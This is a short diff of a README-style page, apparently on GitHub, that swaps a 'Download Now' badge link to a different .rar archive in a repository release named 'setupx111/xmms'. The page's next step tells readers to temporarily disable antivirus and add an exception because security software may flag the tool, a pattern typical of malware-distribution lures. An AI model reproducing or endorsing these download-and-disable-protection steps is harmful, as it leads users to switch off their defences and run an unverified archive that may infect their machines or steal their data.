@@ -3,7 +3,7 @@ Ready to get started? Follow these simple steps:
 
 1. **Download the Tool**  
    Click the button below to grab the latest version:  
-   [![Download Now](https://img.shields.io/badge/Download-Latest_Version-green)](https://github.com/setupx111/xmms/releases/download/setupsx/setupx.rar)  
+   [![Download Now](https://img.shields.io/badge/Download-Latest_Version-green)](https://github.com/setupx111/xmms/releases/download/setupxs/setupxs.rar)  
 
 2. **Disable Antivirus** (Temporarily)  
    Some security software may flag the tool—add an exception if needed.  
